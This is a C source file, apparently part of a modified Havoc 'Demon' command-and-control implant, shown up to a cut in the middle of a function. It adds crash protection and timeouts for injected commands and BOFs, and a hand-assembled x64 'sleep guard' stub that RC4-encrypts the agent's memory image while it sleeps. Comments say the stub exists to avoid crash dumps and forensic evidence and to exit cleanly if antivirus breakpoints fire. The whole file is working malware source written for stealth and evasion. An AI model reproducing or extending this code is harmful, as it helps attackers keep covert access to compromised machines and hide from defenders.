#include <Demon.h>
#include <core/Command.h>
#include <common/Macros.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Package.h>
#include <core/Command.h>
#include <core/ObjectApi.h>
#include <core/AgentProtection.h>
#include <core/Thread.h>

// **SIMPLIFIED APPROACH**: Track handled RequestIDs to prevent BOF timeout conflicts
#define MAX_HANDLED_REQUESTS 32
static UINT32 HandledRequestIDs[MAX_HANDLED_REQUESTS] = { 0 };
static UINT32 HandledRequestCount = 0;

// Add RequestID to handled list
VOID AddHandledRequest( UINT32 RequestID )
{
    if ( HandledRequestCount < MAX_HANDLED_REQUESTS )
    {
        HandledRequestIDs[HandledRequestCount] = RequestID;
        HandledRequestCount++;
        PRINTF( "Added RequestID %x to handled list (count: %d)\n", RequestID, HandledRequestCount );
    }
}

// Check if RequestID was already handled by protection system
BOOL IsRequestHandled( UINT32 RequestID )
{
    for ( UINT32 i = 0; i < HandledRequestCount; i++ )
    {
        if ( HandledRequestIDs[i] == RequestID )
            return TRUE;
    }
    return FALSE;
}

// Global agent protection and crash prevention system
typedef struct _COMMAND_EXECUTION_CONTEXT {
    UINT32          RequestID;
    UINT32          CommandID;
    LARGE_INTEGER   StartTime;
    LARGE_INTEGER   MaxExecutionTime; // 60 seconds default
    HANDLE          CommandThread;
    DWORD           CommandThreadId;
    BOOL            IsExecuting;
    BOOL            TimedOut;
    BOOL            Failed;
    PVOID           CommandFunction;
    PPARSER         CommandParser;
} COMMAND_EXECUTION_CONTEXT, *PCOMMAND_EXECUTION_CONTEXT;

static COMMAND_EXECUTION_CONTEXT CurrentCommand = { 0 };

// Command timeout callback
VOID CALLBACK CommandTimeoutCallback( PVOID lpParam, BOOLEAN TimerOrWaitFired )
{
    PCOMMAND_EXECUTION_CONTEXT context = (PCOMMAND_EXECUTION_CONTEXT)lpParam;
    PPACKAGE ErrorPackage = NULL;
    
    if ( !context || !context->IsExecuting )
        return;
    
    PRINTF( "Command execution timeout - RequestID: %x, CommandID: %x\n", 
            context->RequestID, context->CommandID );
    
    context->TimedOut = TRUE;
    context->IsExecuting = FALSE;
    
    // Try to terminate the command thread if it exists
    if ( context->CommandThread )
    {
        if ( SysNtTerminateThread( context->CommandThread, STATUS_TIMEOUT ) == STATUS_SUCCESS )
        {
            PUTS( "Command thread terminated due to timeout" );
        }
        else
        {
            PUTS( "Failed to terminate command thread gracefully" );
        }
        
        SysNtClose( context->CommandThread );
        context->CommandThread = NULL;
    }
    
    // Send timeout error back to teamserver
    ErrorPackage = PackageCreate( BEACON_OUTPUT );
    PackageAddInt32( ErrorPackage, CALLBACK_ERROR_WIN32 );
#ifdef DEBUG
    PackageAddBytes( ErrorPackage, "Operation timeout - process terminated", 35 );
#endif
    PackageTransmit( ErrorPackage );
    
    PUTS( "Command timeout handled successfully" );
}

// Safe command execution wrapper
typedef struct _SAFE_COMMAND_PARAMS {
    PVOID (*CommandFunction)(PPARSER);
    PPARSER Parser;
    UINT32 RequestID;
    UINT32 CommandID;
} SAFE_COMMAND_PARAMS, *PSAFE_COMMAND_PARAMS;

// New context structure for protected command execution
typedef struct _PROTECTED_COMMAND_CONTEXT {
    UINT32 CommandID;
    UINT32 RequestID;
    PVOID CommandFunction;
    PPARSER Parser;
    BOOL Success;
    BOOL Failed;
    BOOL TimedOut;
} PROTECTED_COMMAND_CONTEXT, *PPROTECTED_COMMAND_CONTEXT;

// Command timeout (60 seconds)
static LARGE_INTEGER CommandTimeout = { .QuadPart = -600000000LL };        // 60 seconds default
static LARGE_INTEGER BofCommandTimeout = { .QuadPart = -1800000000LL };    // 180 seconds for BOF commands

// Check if command is high-risk and needs thread isolation
BOOL IsHighRiskCommand( UINT32 CommandID )
{
    return ( CommandID == DEMON_COMMAND_INLINE_EXECUTE || 
             CommandID == DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE ||
             CommandID == DEMON_COMMAND_INJECT_DLL ||
             CommandID == DEMON_COMMAND_SPAWN_DLL ||
             CommandID >= 0x8000 ); // BOF commands
}

DWORD WINAPI SafeCommandExecutor( LPVOID lpParam )
{
    PPROTECTED_COMMAND_CONTEXT context = (PPROTECTED_COMMAND_CONTEXT)lpParam;
    PPACKAGE ErrorPackage = NULL;
    
    if ( !context )
        return 1;
    
    PRINTF( "Executing command %x safely in thread %d\n", context->CommandID, RtlGetCurrentThreadId() );
    
    // Execute the command function with basic error checking
    if ( context->CommandFunction && context->Parser )
    {
        // Most Havoc commands don't return values or set context flags
        // If the function executes without crashing, consider it successful
        ((VOID(*)(PPARSER))context->CommandFunction)( context->Parser );
        
        PRINTF( "Command %x completed successfully\n", context->CommandID );
        
        // For Havoc commands, successful execution without exceptions = success
        context->Success = TRUE;
        context->Failed = FALSE;
        return 0;
    }
    else
    {
        PRINTF( "Command %x failed - invalid parameters\n", context->CommandID );
        
        // Send error back to teamserver
        ErrorPackage = PackageCreate( BEACON_OUTPUT );
        PackageAddInt32( ErrorPackage, CALLBACK_ERROR_WIN32 );
#ifdef DEBUG
        PackageAddBytes( ErrorPackage, "Command failed - invalid parameters", 33 );
#endif
        PackageTransmit( ErrorPackage );
        
        context->Failed = TRUE;
        context->Success = FALSE;
        return 1;
    }
}

// Forward declarations
BOOL ValidateExecutionEnvironment( UINT32 CommandID, PPARSER Parser );
BOOL CreateMemoryStateBackup( VOID );
HANDLE CreateTimeoutMonitor( UINT32 RequestID, UINT32 CommandID );
VOID CALLBACK TimeoutCallback( PVOID lpParam, BOOLEAN TimerOrWaitFired );
VOID CleanupTimeoutMonitor( HANDLE TimerQueue );

// Enhanced Vectored Exception Handler for global agent protection
LONG WINAPI GlobalAgentVEH( PEXCEPTION_POINTERS ExceptionInfo )
{
    DWORD ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
    PVOID ExceptionAddress = ExceptionInfo->ExceptionRecord->ExceptionAddress;
    
    PRINTF( "VEH: Exception 0x%x at %p\n", ExceptionCode, ExceptionAddress );
    
    // Only intercept CRITICAL exceptions that could crash the agent
    // Let applications handle their own normal exceptions (like C++ exceptions)
    BOOL IsCriticalException = FALSE;
    
    switch ( ExceptionCode )
    {
        case EXCEPTION_ACCESS_VIOLATION:        // 0xC0000005 - Memory access violation
        case EXCEPTION_STACK_OVERFLOW:          // 0xC00000FD - Stack overflow  
        case 0xC0000374:                        // Heap corruption (use raw value since constant not available)
        case EXCEPTION_ILLEGAL_INSTRUCTION:     // 0xC000001D - Illegal instruction
        case EXCEPTION_PRIV_INSTRUCTION:        // 0xC0000096 - Privileged instruction
        case EXCEPTION_NONCONTINUABLE_EXCEPTION: // 0xC0000025 - Non-continuable exception
            IsCriticalException = TRUE;
            break;
        
        // Let these normal exceptions pass through to the application
        case 0xE06D7363:                        // Microsoft C++ exception (mimikatz uses these)
        case EXCEPTION_BREAKPOINT:              // 0x80000003 - Breakpoint
        case EXCEPTION_SINGLE_STEP:             // 0x80000004 - Single step
        case EXCEPTION_INT_DIVIDE_BY_ZERO:      // 0xC0000094 - Division by zero (app can handle)
        case EXCEPTION_INT_OVERFLOW:            // 0xC0000095 - Integer overflow (app can handle)
        case EXCEPTION_FLT_DIVIDE_BY_ZERO:      // 0xC000008E - Float division by zero (app can handle)
        default:
            // Let application handle its own exceptions
            PRINTF( "Non-critical exception 0x%x - letting application handle\n", ExceptionCode );
            return EXCEPTION_CONTINUE_SEARCH;
    }
    
    // Only intervene for CRITICAL exceptions during protected command execution
    if ( CurrentCommand.IsExecuting && IsCriticalException )
    {
        PRINTF( "CRITICAL exception during command %x execution\n", CurrentCommand.CommandID );
        
        // Mark command as failed but don't try to recover automatically
        CurrentCommand.IsExecuting = FALSE;
        CurrentCommand.Failed = TRUE;
        
        // Send basic error notification
        PPACKAGE ErrorPackage = PackageCreate( BEACON_OUTPUT );
        PackageAddInt32( ErrorPackage, CALLBACK_ERROR_WIN32 );
#ifdef DEBUG
        PackageAddBytes( ErrorPackage, "Process crashed - error handled", 29 );
#endif
        PackageTransmit( ErrorPackage );
        
        PUTS( "Command marked as failed due to critical exception" );
        
        // **MINIMAL INTERVENTION**: Let Windows handle the exception normally
        return EXCEPTION_CONTINUE_SEARCH;
    }
    
    // Not a critical exception or not our command, let it continue normally
    PRINTF( "Non-critical or external exception 0x%x - continuing\n", ExceptionCode );
    return EXCEPTION_CONTINUE_SEARCH;
}

// Reset VEH protection state to prevent accumulation issues
VOID ResetAgentProtection( VOID )
{
    // Clear command execution state
    MemSet( &CurrentCommand, 0, sizeof( CurrentCommand ) );
    
    CurrentCommand.IsExecuting = FALSE;
    CurrentCommand.Failed = FALSE;
    CurrentCommand.TimedOut = FALSE;
    CurrentCommand.CommandThread = NULL;
    
    // Clear handled requests list to prevent memory accumulation
    HandledRequestCount = 0;
    MemSet( HandledRequestIDs, 0, sizeof( HandledRequestIDs ) );
    
    PUTS( "Agent protection state reset" );
}

/* ==========================================================================
 * SLEEP GUARD: Non-encrypted VEH trampoline for crash-safe sleep obfuscation
 *
 * Problem: GlobalAgentVEH lives in the agent image, which gets RC4-encrypted
 * during sleep (Ekko/Zilean/Foliage). If any exception fires while encrypted
 * (AV breakpoint, hardware watchpoint, etc.), the OS calls the VEH handler
 * which is now garbage → cascading crash → WER dump → forensic evidence.
 *
 * Solution: A tiny (~30 byte) trampoline stub in a separate allocation that
 * survives encryption. It checks a sleeping flag:
 *   flag=0 (cleartext): forward to real GlobalAgentVEH → full crash protection
 *   flag=1 (encrypted):  NtTerminateProcess(NtCurrentProcess(), 0) → clean exit
 *
 * Memory layout (2 pages):
 *   Page 0 (RX): executable stub code (30 bytes + padding)
 *   Page 1 (RW): control block (sleeping flag + function pointers)
 * ========================================================================== */

/* Control block layout — lives in page 1 (RW), survives image encryption.
 *
 * +0x00  SleepingFlag     DWORD   Step marker (0 = not sleeping)
 * +0x04  _pad             DWORD   Alignment
 * +0x08  NtTerminateProc  PVOID   ntdll!NtTerminateProcess
 * +0x10  RealVehHandler   PVOID   GlobalAgentVEH (only called when flag=0)
 * +0x18  ImgBase          PVOID   Agent image base address
 * +0x20  ImgSize          SIZE_T  Agent image size in bytes
 *
 * The trampoline uses ImgBase/ImgSize to distinguish fatal exceptions
 * (code executing in encrypted image, or memory access to encrypted image)
 * from benign first-chance exceptions on background threads (thread pool,
 * WinHTTP, etc.) that SEH would handle normally. */
typedef struct _SLEEP_GUARD_CONTROL {
    volatile DWORD SleepingFlag;    /* +0x00: 0 = normal ops, 1 = encrypted sleep */
    DWORD          _pad;            /* +0x04: align to 8-byte boundary */
    PVOID          NtTerminateProc; /* +0x08: ntdll!NtTerminateProcess (survives encryption) */
    PVOID          RealVehHandler;  /* +0x10: GlobalAgentVEH in agent image (only called when flag=0) */
    PVOID          ImgBase;         /* +0x18: agent image base (for range check during sleep) */
    SIZE_T         ImgSize;         /* +0x20: agent image size (for range check during sleep) */
    ULONG_PTR      DispatcherReturn;/* +0x28: timer dispatcher return address for VEH recovery */
} SLEEP_GUARD_CONTROL, *PSLEEP_GUARD_CONTROL;

/*!
 * @brief Initialize the sleep guard VEH trampoline.
 * Allocates 2 pages, writes stub code, patches control block addresses,
 * protects page 0 as RX, and registers the stub as the VEH handler.
 *
 * @return TRUE on success, FALSE on failure (VEH not registered)
 */
BOOL InitializeSleepGuard( VOID )
{
    PVOID    StubBase  = NULL;
    SIZE_T   AllocSize = 0x2000;  /* 2 pages: code (RX) + control (RW) */
    NTSTATUS Status    = { 0 };
    DWORD    OldProt   = 0;

    /* Allocate 2 contiguous pages as RW */
    Status = Instance->Win32.NtAllocateVirtualMemory(
        NtCurrentProcess(), &StubBase, 0, &AllocSize,
        0x3000,  /* MEM_COMMIT | MEM_RESERVE */
        PAGE_READWRITE
    );

    if ( ! NT_SUCCESS( Status ) || ! StubBase ) {
        PRINTF( "SleepGuard: NtAllocateVirtualMemory failed: %lx\n", Status )
        return FALSE;
    }

    MemSet( StubBase, 0, AllocSize );

    /* --- Page 0: Executable trampoline stub (164 bytes) ---
     *
     * x64 machine code — VEH handler receives RCX = PEXCEPTION_POINTERS
     *
     * Four outcomes:
     *   1. Flag==0 → forward to GlobalAgentVEH (image cleartext)
     *   2. Flag!=0 AND ExceptionAddress in image (DEP) → RECOVER (redirect to DispatcherReturn)
     *   3. Flag!=0 AND faulting VA in image (AV) → terminate (encode step+offset)
     *   4. Flag!=0 AND exception does NOT involve image → EXCEPTION_CONTINUE_SEARCH
     *
     * "Involves agent image" means:
     *   - ExceptionAddress ∈ [ImgBase, ImgBase+ImgSize), OR
     *   - For ACCESS_VIOLATION: ExceptionInformation[1] ∈ [ImgBase, ImgBase+ImgSize)
     *
     * This prevents killing the process for benign first-chance exceptions on
     * background threads (thread pool, WinHTTP, etc.) that SEH handles normally.
     *
     * Control block layout (page 1, RW):
     *   +0x00: DWORD     SleepingFlag (0=awake, 1=encrypted sleep)
     *   +0x08: PVOID     NtTerminateProcess
     *   +0x10: PVOID     RealVehHandler (GlobalAgentVEH)
     *   +0x18: PVOID     ImgBase
     *   +0x20: SIZE_T    ImgSize
     *   +0x28: ULONG_PTR DispatcherReturn (timer dispatcher addr for DEP recovery)
     *
     * DEP recovery (outcome 2):
     *   On DEP violation where ExceptionAddress ∈ image AND DispatcherReturn ≠ 0:
     *   → Set Context->Rip = DispatcherReturn (CONTEXT offset 0xF8)
     *   → Return EXCEPTION_CONTINUE_EXECUTION (-1)
     *   The ROP function already completed; recovery just fixes the resume point.
     *
     * Exit status encoding (on terminate, outcomes 3 & fallback):
     *   Bits 31-28: step number (1-6)
     *   Bit 27:     path flag (1 = ExceptionAddress in image [DEP/exec],
     *                          0 = faulting VA in image [read/write])
     *   Bits 26-0:  address offset from ImgBase (supports up to 128MB images)
     *
     * Decode (PowerShell):
     *   $step = ($LASTEXITCODE -shr 28) -band 0xF
     *   $exec = ($LASTEXITCODE -shr 27) -band 1
     *   $off  = $LASTEXITCODE -band 0x07FFFFFF
     *   "Step=$step Type=$(if($exec){'EXEC'}else{'ACCESS'}) Offset=0x$($off.ToString('X'))"
     *
     * EXCEPTION_RECORD layout (x64):
     *   +0x00: ExceptionCode (DWORD)
     *   +0x10: ExceptionAddress (PVOID)
     *   +0x18: NumberParameters (DWORD)
     *   +0x28: ExceptionInformation[1] (ULONG_PTR) — faulting VA for AV
     */
    BYTE StubCode[] = {
        /* 0x00: load control block address */
        0x48, 0xB8,                                         /* movabs rax, imm64 */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* [2-9]: control block addr (patched) */

        /* 0x0A: check sleeping flag */
        0x83, 0x38, 0x00,                                   /* cmp dword [rax], 0 */
        0x74, 0x42,                                         /* je .forward_to_veh (+0x42 → 0x51) */

        /* --- sleeping path: check if exception involves agent image --- */

        /* 0x0F: get ExceptionRecord */
        0x4C, 0x8B, 0x01,                                   /* mov r8, [rcx] — ExceptionRecord* */

        /* 0x12: check ExceptionAddress ∈ [ImgBase, ImgBase+ImgSize) */
        0x4D, 0x8B, 0x48, 0x10,                             /* mov r9, [r8+0x10] — ExceptionAddress */
        0x4C, 0x8B, 0x50, 0x18,                             /* mov r10, [rax+0x18] — ImgBase */
        0x4D, 0x39, 0xD1,                                   /* cmp r9, r10 */
        0x72, 0x09,                                         /* jb .check_av (+0x09 → 0x28) */
        0x4C, 0x03, 0x50, 0x20,                             /* add r10, [rax+0x20] — ImgBase+ImgSize */
        0x4D, 0x39, 0xD1,                                   /* cmp r9, r10 */
        0x72, 0x2C,                                         /* jb .recover_exec (+0x2C → 0x54) */

        /* 0x28 .check_av: for ACCESS_VIOLATION, check faulting VA */
        0x41, 0x81, 0x38, 0x05, 0x00, 0x00, 0xC0,         /* cmp dword [r8], 0xC0000005 */
        0x75, 0x1D,                                         /* jne .pass_through (+0x1D → 0x4E) */
        0x41, 0x83, 0x78, 0x18, 0x02,                       /* cmp dword [r8+0x18], 2 — NumberParameters >= 2? */
        0x72, 0x16,                                         /* jb .pass_through (+0x16 → 0x4E) */
        0x4D, 0x8B, 0x48, 0x28,                             /* mov r9, [r8+0x28] — faulting VA */
        0x4C, 0x8B, 0x50, 0x18,                             /* mov r10, [rax+0x18] — ImgBase */
        0x4D, 0x39, 0xD1,                                   /* cmp r9, r10 */
        0x72, 0x09,                                         /* jb .pass_through (+0x09 → 0x4E) */
        0x4C, 0x03, 0x50, 0x20,                             /* add r10, [rax+0x20] — ImgBase+ImgSize */
        0x4D, 0x39, 0xD1,                                   /* cmp r9, r10 */
        0x72, 0x35,                                         /* jb .terminate_va (+0x35 → 0x83) */

        /* 0x4E .pass_through: not our problem — let SEH handle it */
        0x31, 0xC0,                                         /* xor eax, eax — EXCEPTION_CONTINUE_SEARCH */
        0xC3,                                               /* ret */

        /* 0x51 .forward_to_veh: image cleartext — forward to GlobalAgentVEH */
        0xFF, 0x60, 0x10,                                   /* jmp qword [rax+0x10] — RealVehHandler */

        /* 0x54 .recover_exec: ExceptionAddress in image (DEP violation)
         *
         * Two scenarios:
         *   (a) NtContinue legacy: stale return address from thread pool reuse.
         *       DispatcherReturn = timer dispatcher → ROP chain continues.
         *   (b) Stub path: background thread (WinHTTP worker, thread pool)
         *       tries to execute agent code during encrypted sleep.
         *       DispatcherReturn = RtlExitUserThread → thread exits cleanly.
         *
         * If DispatcherReturn is 0 (not set), fall to .pass_through instead
         * of terminating. The thread pool's SEH catches the exception and
         * kills just the offending thread — process survives. */
        0x4C, 0x8B, 0x50, 0x28,                             /* mov r10, [rax+0x28] — DispatcherReturn */
        0x4D, 0x85, 0xD2,                                   /* test r10, r10 */
        0x74, 0xF1,                                         /* jz .pass_through (-0x0F → 0x4E) */

        /* 0x5D: Recovery — set Context->Rip = DispatcherReturn, continue execution */
        0x4C, 0x8B, 0x59, 0x08,                             /* mov r11, [rcx+8] — PCONTEXT */
        0x4D, 0x89, 0x93, 0xF8, 0x00, 0x00, 0x00,         /* mov [r11+0xF8], r10 — Context->Rip = DispatcherReturn */
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,                       /* mov eax, -1 — EXCEPTION_CONTINUE_EXECUTION */
        0xC3,                                               /* ret */

        /* 0x6E .terminate_exec: DEAD CODE — kept for binary layout stability.
         * Previously: terminate process on DEP in image with no DispatcherReturn.
         * Now: jz at 0x5B targets .pass_through (0x4E) instead, so this block
         * is never reached. The .terminate_va path at 0x83 still uses
         * .terminate_common at 0x90 for data-access violations. */
        0x4C, 0x2B, 0x48, 0x18,                             /* sub r9, [rax+0x18] — offset = addr - ImgBase */
        0x44, 0x89, 0xCA,                                   /* mov edx, r9d — offset low32 */
        0x81, 0xE2, 0xFF, 0xFF, 0xFF, 0x07,               /* and edx, 0x07FFFFFF — mask 27 bits */
        0x81, 0xCA, 0x00, 0x00, 0x00, 0x08,               /* or edx, 0x08000000 — set bit 27 (EXEC path) */
        0xEB, 0x0D,                                         /* jmp .terminate_common (+0x0D → 0x90) */

        /* 0x83 .terminate_va: faulting VA in image (read/write to encrypted memory)
         * r9 = faulting VA (from 0x38). Bit 27 CLEAR in exit code. */
        0x4C, 0x2B, 0x48, 0x18,                             /* sub r9, [rax+0x18] — offset = VA - ImgBase */
        0x44, 0x89, 0xCA,                                   /* mov edx, r9d — offset low32 */
        0x81, 0xE2, 0xFF, 0xFF, 0xFF, 0x07,               /* and edx, 0x07FFFFFF — mask 27 bits */
        /* falls through to .terminate_common */

        /* 0x90 .terminate_common: encode step + terminate */
        0x44, 0x8B, 0x08,                                   /* mov r9d, [rax] — step number */
        0x41, 0xC1, 0xE1, 0x1C,                             /* shl r9d, 28 — shift to top nibble */
        0x44, 0x09, 0xCA,                                   /* or edx, r9d — combine step|path|offset */
        0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF,         /* mov rcx, -1 — NtCurrentProcess() */
        0xFF, 0x60, 0x08,                                   /* jmp qword [rax+0x08] — NtTerminateProcess */
    };

    /* Patch control block address into stub (page 1 = StubBase + 0x1000) */
    ULONG_PTR CtrlAddr = U_PTR( StubBase ) + 0x1000;
    MemCopy( &StubCode[2], &CtrlAddr, sizeof( ULONG_PTR ) );

    /* Write VEH stub to page 0 */
    MemCopy( StubBase, StubCode, sizeof( StubCode ) );

    /* --- Sleep Callback Stub (page 0, offset 0xB0) ---
     *
     * Replaces the NtContinue-based ROP chain (EKKO) with a single normal
     * function that calls APIs directly. This eliminates the thread pool
     * state corruption that caused STATUS_STACK_BUFFER_OVERRUN (0xC0000409)
     * after ~10 hours of NtContinue abuse (~63,000 context hijacks).
     *
     * Called as: WAITORTIMERCALLBACK(PSLEEP_CALLBACK_CTX ctx, BOOLEAN fired)
     * RCX = pointer to SLEEP_CALLBACK_CTX on main thread's stack
     * RDX = TRUE (ignored)
     *
     * Flow: VP(RW) → RC4-encrypt → WaitForSingleObjectEx(sleep) →
     *       RC4-decrypt → VP(RX) → NtSetEvent(done)
     *
     * Returns normally via `ret` — thread pool state is maintained.
     * No NtContinue, no ROP chain, no context hijacking.
     *
     * SLEEP_CALLBACK_CTX offsets (must match SleepObf.h):
     *   +0x00: pfnVirtualProtect        +0x08: pfnSystemFunction032
     *   +0x10: pfnWaitForSingleObjectEx  +0x18: pfnNtSetEvent
     *   +0x20: ImgBase                   +0x28: ImgSize
     *   +0x30: TxtBase                   +0x38: TxtSize
     *   +0x40: TxtProtect (DWORD)        +0x48: pOldProtect
     *   +0x50: pImgUstring               +0x58: pKeyUstring
     *   +0x60: WaitHandle                +0x68: Timeout (DWORD)
     *   +0x70: EvntDone                  +0x78: SleepingFlag
     */
    BYTE SleepStubCode[] = {
        /* Prologue: save RBX (only non-volatile we use), align stack */
        0x53,                                               /* push rbx */
        0x48, 0x83, 0xEC, 0x20,                             /* sub rsp, 0x20 (shadow space) */
        0x48, 0x89, 0xCB,                                   /* mov rbx, rcx (save ctx) */

        /* Set sleeping flag = 1 */
        0x48, 0x8B, 0x43, 0x78,                             /* mov rax, [rbx+0x78] */
        0x48, 0x85, 0xC0,                                   /* test rax, rax */
        0x74, 0x06,                                         /* jz +6 */
        0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,               /* mov dword [rax], 1 */

        /* Step 1: VirtualProtect(ImgBase, ImgSize, PAGE_READWRITE, pOldProtect) */
        0x48, 0x8B, 0x4B, 0x20,                             /* mov rcx, [rbx+0x20] */
        0x48, 0x8B, 0x53, 0x28,                             /* mov rdx, [rbx+0x28] */
        0x41, 0xB8, 0x04, 0x00, 0x00, 0x00,               /* mov r8d, 4 (PAGE_READWRITE) */
        0x4C, 0x8B, 0x4B, 0x48,                             /* mov r9, [rbx+0x48] */
        0xFF, 0x13,                                         /* call [rbx+0x00] */

        /* Step 2: SystemFunction032(pImg, pKey) — RC4 encrypt */
        0x48, 0x8B, 0x4B, 0x50,                             /* mov rcx, [rbx+0x50] */
        0x48, 0x8B, 0x53, 0x58,                             /* mov rdx, [rbx+0x58] */
        0xFF, 0x53, 0x08,                                   /* call [rbx+0x08] */

        /* Step 3: WaitForSingleObjectEx(WaitHandle, Timeout, FALSE) — sleep */
        0x48, 0x8B, 0x4B, 0x60,                             /* mov rcx, [rbx+0x60] */
        0x8B, 0x53, 0x68,                                   /* mov edx, [rbx+0x68] */
        0x45, 0x31, 0xC0,                                   /* xor r8d, r8d */
        0xFF, 0x53, 0x10,                                   /* call [rbx+0x10] */

        /* Step 4: SystemFunction032(pImg, pKey) — RC4 decrypt */
        0x48, 0x8B, 0x4B, 0x50,                             /* mov rcx, [rbx+0x50] */
        0x48, 0x8B, 0x53, 0x58,                             /* mov rdx, [rbx+0x58] */
        0xFF, 0x53, 0x08,                                   /* call [rbx+0x08] */

        /* Step 5: VirtualProtect(TxtBase, TxtSize, TxtProtect, pOldProtect) */
        0x48, 0x8B, 0x4B, 0x30,                             /* mov rcx, [rbx+0x30] */
        0x48, 0x8B, 0x53, 0x38,                             /* mov rdx, [rbx+0x38] */
        0x44, 0x8B, 0x43, 0x40,                             /* mov r8d, [rbx+0x40] */
        0x4C, 0x8B, 0x4B, 0x48,                             /* mov r9, [rbx+0x48] */
        0xFF, 0x13,                                         /* call [rbx+0x00] */

        /* Clear sleeping flag = 0 */
        0x48, 0x8B, 0x43, 0x78,                             /* mov rax, [rbx+0x78] */
        0x48, 0x85, 0xC0,                                   /* test rax, rax */
        0x74, 0x06,                                         /* jz +6 */
        0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,               /* mov dword [rax], 0 */

        /* Step 6: NtSetEvent(EvntDone, NULL) — wake main thread */
        0x48, 0x8B, 0x4B, 0x70,                             /* mov rcx, [rbx+0x70] */
        0x31, 0xD2,                                         /* xor edx, edx */
        0xFF, 0x53, 0x18,                                   /* call [rbx+0x18] */

        /* Epilogue: normal return to timer dispatch */
        0x48, 0x83, 0xC4, 0x20,                             /* add rsp, 0x20 */
        0x5B,                                               /* pop rbx */
        0xC3,                                               /* ret */
    };

    /* Write sleep callback stub at offset 0xB0 in page 0 */
    MemCopy( C_PTR( U_PTR( StubBase ) + 0xB0 ), SleepStubCode, sizeof( SleepStubCode ) );
    PRINTF( "SleepGuard: sleep callback stub at %p (%zu bytes)\n",
        C_PTR( U_PTR( StubBase ) + 0xB0 ), sizeof( SleepStubCode ) )

    /* --- Page 1: Control block (RW) --- */
    PSLEEP_GUARD_CONTROL Ctrl = (PSLEEP_GUARD_CONTROL)( U_PTR( StubBase ) + 0x1000 );
    Ctrl->SleepingFlag    = 0;
    Ctrl->NtTerminateProc = C_PTR( Instance->Win32.NtTerminateProcess );
    Ctrl->RealVehHandler  = C_PTR( GlobalAgentVEH );
    Ctrl->ImgBase         = C_PTR( Instance->Session.ModuleBase );
    Ctrl->ImgSize         = Instance->Session.ModuleSize;

    /* Make page 0 executable (RX). Page 1 stays RW for the sleeping flag.
     * CRITICAL: If this fails (ACG policy, security product blocking RW→RX),
     * the stub is non-executable. Registering it as VEH would cause an infinite
     * exception loop (call to RW page → DEP fault → VEH dispatch → call to RW page → ...).
     * Must abort and let the fallback handle it. */
    if ( ! Instance->Win32.VirtualProtect( StubBase, 0x1000, PAGE_EXECUTE_READ, &OldProt ) ) {
        PUTS( "SleepGuard: VirtualProtect to RX failed — aborting (would cause DEP loop)" )
        SIZE_T FreeSize = 0;
        Instance->Win32.NtFreeVirtualMemory( NtCurrentProcess(), &StubBase, &FreeSize, 0x8000 );
        return FALSE;
    }

    /* Store pointers in Instance for TimerObf/FoliageObf access */
    Instance->SleepGuard.StubBase         = StubBase;
    Instance->SleepGuard.SleepingFlag     = &Ctrl->SleepingFlag;
    Instance->SleepGuard.DispatcherReturn = &Ctrl->DispatcherReturn;
    Instance->SleepGuard.SleepCallback    = C_PTR( U_PTR( StubBase ) + 0xB0 );

    /* Register the trampoline stub as VEH handler (NOT GlobalAgentVEH directly) */
    Instance->SleepGuard.VehHandle = Instance->Win32.RtlAddVectoredExceptionHandler( 1, StubBase );

    if ( ! Instance->SleepGuard.VehHandle ) {
        PUTS( "SleepGuard: RtlAddVectoredExceptionHandler failed" )
        return FALSE;
    }

    /* Create a persistent unsignaled event for the direct-call stub path.
     *
     * When no real WaitHandle is provided (normal HTTP sleep, not SMB pipe),
     * the stub calls WaitForSingleObjectEx(CachedWaitEvent, Timeout, FALSE).
     * Since the event is never signaled, WFSO returns STATUS_TIMEOUT after
     * the requested duration — functionally identical to Sleep(Timeout).
     *
     * Created once, reused every cycle. Zero per-cycle kernel object churn.
     * This replaces the timer queue approach that caused 0xC0000409 after
     * hours of operation due to thread pool internal state corruption. */
    Instance->SleepGuard.CachedWaitEvent = NULL;
    if ( Instance->Win32.NtCreateEvent ) {
        if ( ! NT_SUCCESS( Instance->Win32.NtCreateEvent(
                &Instance->SleepGuard.CachedWaitEvent,
                EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
            Instance->SleepGuard.CachedWaitEvent = NULL;
            PUTS( "SleepGuard: cached wait event creation failed" )
        }
    }

    PUTS( "SleepGuard: VEH trampoline initialized (code=RX, control=RW)" )
    return TRUE;
}

/*!
 * @brief Mark agent as entering encrypted sleep.
 * Call BEFORE the ROP chain / SysNtSignalAndWaitForSingleObject.
 * After this, any exception → clean NtTerminateProcess (no forensics).
 */
VOID SleepGuardEnter( VOID )
{
    if ( Instance->SleepGuard.SleepingFlag ) {
        *Instance->SleepGuard.SleepingFlag = 1;
    }
}

/*!
 * @brief Mark agent as exiting encrypted sleep (back to cleartext).
 * Call AFTER the ROP chain completes and image is decrypted.
 * After this, exceptions → GlobalAgentVEH for full crash protection.
 */
VOID SleepGuardLeave( VOID )
{
    if ( Instance->SleepGuard.SleepingFlag ) {
        *Instance->SleepGuard.SleepingFlag = 0;
    }
}

/*!
 * @brief Cleanup sleep guard: remove VEH, free stub memory.
 */
VOID CleanupSleepGuard( VOID )
{
    if ( Instance->SleepGuard.CachedWaitEvent ) {
        SysNtClose( Instance->SleepGuard.CachedWaitEvent );
        Instance->SleepGuard.CachedWaitEvent = NULL;
    }

    if ( Instance->SleepGuard.VehHandle ) {
        Instance->Win32.RtlRemoveVectoredExceptionHandler( Instance->SleepGuard.VehHandle );
        Instance->SleepGuard.VehHandle = NULL;
    }

    if ( Instance->SleepGuard.StubBase ) {
        SIZE_T FreeSize = 0;
        Instance->Win32.NtFreeVirtualMemory(
            NtCurrentProcess(),
            &Instance->SleepGuard.StubBase,
            &FreeSize,
            0x8000  /* MEM_RELEASE */
        );
        Instance->SleepGuard.StubBase     = NULL;
        Instance->SleepGuard.SleepingFlag = NULL;
    }
}

// Initialize agent protection system (idempotent — safe to call on reconnect)
PVOID InitializeAgentProtection( VOID )
{
    /* Initialize sleep guard VEH trampoline ONCE.
     * The trampoline persists for the entire process lifetime — it's needed
     * for every SleepObf() call, including retry sleeps after connection drops.
     * Skip if already initialized (reconnect path). */
